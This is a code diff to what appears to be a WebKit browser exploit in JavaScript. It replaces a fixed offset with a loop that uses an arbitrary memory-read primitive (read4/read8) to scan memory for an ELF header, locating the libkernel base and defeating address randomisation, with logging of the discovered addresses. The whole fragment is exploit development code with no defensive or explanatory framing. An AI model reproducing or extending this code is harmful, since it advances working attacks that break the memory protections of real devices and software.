@@ -542,7 +542,29 @@ const WORKER_STATE = {
     );
     const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
     const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-    const libkernelBase = errorFn.sub32(off.k__error);
+    let libkernelBase = null;
+    let measuredKError = null;
+    const libkernelSearchStart = errorFn.and32(0xffffc000);
+    for (let i = 0; i <= 0x100; ++i) {
+      const candidate = libkernelSearchStart.sub32(i * 0x4000);
+      try {
+        if ((p.read4(candidate) >>> 0) !== 0x464c457f) continue;
+        libkernelBase = candidate;
+        measuredKError = (errorFn.low - candidate.low) >>> 0;
+        break;
+      } catch (e) {}
+    }
+    if (!libkernelBase) {
+      mark(
+        "LIBKERNEL-ELF-NOT-FOUND",
+        "errorFn=" + errorFn + " search=0x4000/4MB",
+      );
+      return;
+    }
+    mark(
+      "LIBKERNEL-DISCOVERED",
+      "base=" + libkernelBase + " k__error=0x" + measuredKError.toString(16),
+    );
     mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
     const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
     if (
